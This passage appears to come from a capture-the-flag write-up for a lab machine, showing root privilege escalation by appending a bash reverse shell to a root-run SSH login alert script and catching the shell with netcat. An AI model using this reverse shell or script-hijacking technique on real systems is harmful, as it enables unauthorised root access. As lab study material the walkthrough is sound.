- Run pspy and ssh in another window to see some automated processes that fire on a user login
```bash
2022/05/17 17:41:47 CMD: UID=110  PID=30907  | sshd: [net]          
2022/05/17 17:41:47 CMD: UID=0    PID=30908  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/05/17 17:41:47 CMD: UID=0    PID=30912  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/05/17 17:41:47 CMD: UID=0    PID=30914  | sendmail: MTA: ./24HHfljr030913 from queue     
2022/05/17 17:41:47 CMD: UID=0    PID=30916  | /etc/mail/smrsh/procmail -t -f svc_acc@new -a  -d root 
2022/05/17 17:41:47 CMD: UID=1000 PID=30915  | sshd: svc_acc
```
- ```/usr/local/sbin/ssh-alert.sh``` is custom and it runs as root on a login so it probably warrants a look
	- This is definitely the privesc vector -> root chowns the ssh-alert.sh script to the compromised user on a cronjob
Content of ```/usr/local/sbin/ssh-alert.sh```: 
```bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```
- Add a reverse shell to bottom of the file
```bash
echo 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1' >> /usr/local/sbin/ssh-alert.sh
```
- Log out and back in to fire the script and receive the root shell
```bash
nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.156] 34482
bash: cannot set terminal process group (31207): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```